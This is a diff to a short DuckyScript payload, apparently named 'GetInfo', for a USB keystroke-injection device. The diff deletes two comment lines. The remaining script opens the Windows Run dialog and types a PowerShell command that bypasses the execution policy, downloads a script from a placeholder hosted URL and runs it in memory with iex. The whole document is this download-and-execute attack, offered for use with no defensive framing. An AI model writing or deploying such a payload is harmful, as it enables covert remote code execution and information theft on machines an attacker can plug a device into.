@@ -1,6 +1,4 @@
-﻿REM GetInfo
 GUI r
 DELAY 500
-REM replace 'link-to/getinfo.ps1' with your cusom hosted url (read readme.)
 STRING powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb 'link-to/getinfo.ps1' | iex"
 ENTER
